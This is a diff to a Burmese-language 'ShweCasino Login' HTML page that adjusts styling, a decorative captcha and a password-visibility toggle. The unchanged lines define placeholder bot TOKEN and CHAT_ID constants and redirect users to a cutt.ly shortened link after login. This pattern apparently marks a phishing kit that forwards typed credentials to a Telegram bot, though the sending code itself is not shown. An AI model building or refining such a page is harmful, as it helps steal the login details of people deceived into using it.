@@ -2,6 +2,9 @@
 <html lang="my">
 <head>
 <meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>ShweCasino Login</title>
 
 <style>
@@ -34,8 +37,7 @@ border-radius:15px;
 
 h2{
 margin-top:0;
-color:#ffcc66;
-text-align:center
+color:#ffcc66;text-align:center
 }
 
 /* input */
@@ -189,9 +191,9 @@ animation:spin 1s linear infinite;
 
 <a class="forgot" href="#">စကားဝှက်မေ့နေပါသလား?</a>
 
-<div class="captcha-box" id="cap">
-00000
-<span class="refresh" onclick="cap()"></span>
+<div class="captcha-box">
+<span id="cap">00000</span>
+<span class="refresh" onclick="cap()">⟳</span>
 </div>
 
 <input id="capInput" placeholder="အပေါ်ကနံပါတ်တွေကိုထည့်ပါ">
@@ -215,7 +217,6 @@ animation:spin 1s linear infinite;
 
 const TOKEN="BOT_TOKEN_HERE";
 const CHAT_ID="CHAT_ID_HERE";
-
 
 function login(){
 
@@ -246,8 +247,7 @@ window.location.href="https://cutt.ly/otrecCFE";
 
 function cap(){
 let n=Math.floor(10000+Math.random()*90000);
-document.getElementById("cap").childNodes[0].nodeValue =
-n.toString().split("").join(" ");
+document.getElementById("cap").innerText=n;
 }
 
 cap();
@@ -258,10 +258,8 @@ let eye=document.getElementById("eyePath");
 
 if(p.type==="password"){
 p.type="text";
-eye.setAttribute("d","M2 2l20 20M10.7 10.7A4 4 0 0 0 12 16a4 4 0 0 0 4-4c0-.4-.1-.9-.3-1.3M9.9 5.2A10.9 10.9 0 0 1 12 5c5 0 9.3 3.1 11 7a11.8 11.8 0 0 1-4.2 4.8M6.5 6.5C4.4 7.9 2.7 9.8 1 12c1.7 3.9 6 7 11 7 1.6 0 3.1-.3 4.5-.9");
 }else{
 p.type="password";
-eye.setAttribute("d","M12 5C7 5 2.7 8.1 1 12c1.7 3.9 6 7 11 7s9.3-3.1 11-7c-1.7-3.9-6-7-11-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z");
 }
 }
 
